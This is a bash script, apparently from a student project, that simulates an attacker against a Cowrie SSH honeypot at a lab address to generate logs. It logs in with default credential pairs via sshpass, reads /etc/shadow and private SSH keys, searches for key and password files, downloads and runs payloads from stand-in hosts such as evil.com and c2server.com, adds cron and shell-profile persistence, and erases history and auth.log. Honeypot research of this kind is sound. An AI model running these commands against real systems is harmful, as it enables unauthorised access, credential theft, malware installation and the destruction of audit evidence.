#!/bin/bash
# Post-access simulation - targets Cowrie

COWRIE="172.16.0.20"
LOGDIR="/home/kali/Desktop/fyp/attack_scripts/logs/post_access"

mkdir -p "$LOGDIR"

CREDS=("root:123456789" "root:password" "root:12345" "admin:admin" "root:root")

run_cmd() {
    local user="$1"
    local pass="$2"
    local cmd="$3"
    sshpass -p "$pass" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=10 \
        "$user@$COWRIE" "$cmd" 2>&1 >> "$LOGDIR/post_${COWRIE}.txt"
    sleep 1
}

echo "Post-access on $COWRIE"

if nc -zw2 "$COWRIE" 22 2>/dev/null; then
    for cred in "${CREDS[@]}"; do
        user=$(echo $cred | cut -d: -f1)
        pass=$(echo $cred | cut -d: -f2)
        
        echo "Session with $user:$pass"
        
        # System enumeration
        run_cmd "$user" "$pass" "whoami"
        run_cmd "$user" "$pass" "id"
        run_cmd "$user" "$pass" "uname -a"
        run_cmd "$user" "$pass" "hostname"
        run_cmd "$user" "$pass" "uptime"
        run_cmd "$user" "$pass" "cat /etc/issue"
        run_cmd "$user" "$pass" "cat /etc/os-release"
        
        # User enumeration
        run_cmd "$user" "$pass" "cat /etc/passwd"
        run_cmd "$user" "$pass" "cat /etc/shadow"
        run_cmd "$user" "$pass" "cat /etc/group"
        run_cmd "$user" "$pass" "w"
        run_cmd "$user" "$pass" "who"
        run_cmd "$user" "$pass" "last"
        
        # File system exploration
        run_cmd "$user" "$pass" "ls -la /"
        run_cmd "$user" "$pass" "ls -la /home"
        run_cmd "$user" "$pass" "ls -la /root"
        run_cmd "$user" "$pass" "ls -la /opt"
        run_cmd "$user" "$pass" "ls -la /var"
        run_cmd "$user" "$pass" "ls -la /tmp"
        run_cmd "$user" "$pass" "ls -la /etc"
        run_cmd "$user" "$pass" "ls -la /var/www"
        run_cmd "$user" "$pass" "ls -la /var/log"
        
        # Sensitive file search
        run_cmd "$user" "$pass" "cat /etc/ssh/sshd_config"
        run_cmd "$user" "$pass" "cat /etc/hosts"
        run_cmd "$user" "$pass" "cat /etc/resolv.conf"
        run_cmd "$user" "$pass" "cat /etc/crontab"
        run_cmd "$user" "$pass" "cat ~/.ssh/authorized_keys"
        run_cmd "$user" "$pass" "cat ~/.ssh/id_rsa"
        run_cmd "$user" "$pass" "cat ~/.bashrc"
        run_cmd "$user" "$pass" "cat ~/.bash_history"
        
        # Find commands
        run_cmd "$user" "$pass" "find / -name '*.conf' 2>/dev/null | head -30"
        run_cmd "$user" "$pass" "find / -name '*.txt' 2>/dev/null | head -30"
        run_cmd "$user" "$pass" "find / -name '*.log' 2>/dev/null | head -30"
        run_cmd "$user" "$pass" "find / -name 'password*' 2>/dev/null"
        run_cmd "$user" "$pass" "find / -name 'credentials*' 2>/dev/null"
        run_cmd "$user" "$pass" "find / -name '*.key' 2>/dev/null"
        run_cmd "$user" "$pass" "find / -name '*.pem' 2>/dev/null"
        run_cmd "$user" "$pass" "find / -perm -4000 2>/dev/null"
        
        # Network info
        run_cmd "$user" "$pass" "ifconfig"
        run_cmd "$user" "$pass" "ip addr"
        run_cmd "$user" "$pass" "ip route"
        run_cmd "$user" "$pass" "netstat -an"
        run_cmd "$user" "$pass" "ss -tulpn"
        run_cmd "$user" "$pass" "arp -a"
        run_cmd "$user" "$pass" "cat /etc/hosts"
        
        # Process info
        run_cmd "$user" "$pass" "ps aux"
        run_cmd "$user" "$pass" "ps -ef"
        run_cmd "$user" "$pass" "top -bn1 | head -20"
        
        # Cron jobs
        run_cmd "$user" "$pass" "crontab -l"
        run_cmd "$user" "$pass" "ls -la /etc/cron.d"
        run_cmd "$user" "$pass" "ls -la /etc/cron.daily"
        
        # Download attempts
        run_cmd "$user" "$pass" "wget http://malware.com/shell.sh -O /tmp/shell.sh"
        run_cmd "$user" "$pass" "curl -o /tmp/backdoor http://evil.com/backdoor"
        run_cmd "$user" "$pass" "wget http://update.net/agent -O /tmp/agent"
        run_cmd "$user" "$pass" "curl http://c2server.com/config.bin > /tmp/config"
        run_cmd "$user" "$pass" "busybox wget http://botnet.io/bot"
        
        # Execution attempts
        run_cmd "$user" "$pass" "chmod +x /tmp/shell.sh"
        run_cmd "$user" "$pass" "chmod 777 /tmp/*"
        run_cmd "$user" "$pass" "/tmp/shell.sh"
        run_cmd "$user" "$pass" "sh /tmp/agent"
        
        # Persistence
        run_cmd "$user" "$pass" "echo '* * * * * /tmp/shell.sh' >> /etc/crontab"
        run_cmd "$user" "$pass" "echo '/tmp/agent &' >> ~/.bashrc"
        run_cmd "$user" "$pass" "echo 'nohup /tmp/backdoor &' >> /etc/profile"
        
        # Lateral movement recon
        run_cmd "$user" "$pass" "cat ~/.ssh/known_hosts"
        run_cmd "$user" "$pass" "cat /etc/hosts"
        run_cmd "$user" "$pass" "arp -a"
        run_cmd "$user" "$pass" "ping -c 1 172.16.0.30"
        
        # Cleanup attempts
        run_cmd "$user" "$pass" "history -c"
        run_cmd "$user" "$pass" "rm -rf ~/.bash_history"
        run_cmd "$user" "$pass" "cat /dev/null > /var/log/auth.log"
        
        echo "Completed $user:$pass"
    done
else
    echo "SSH not open"
fi

echo "Done"
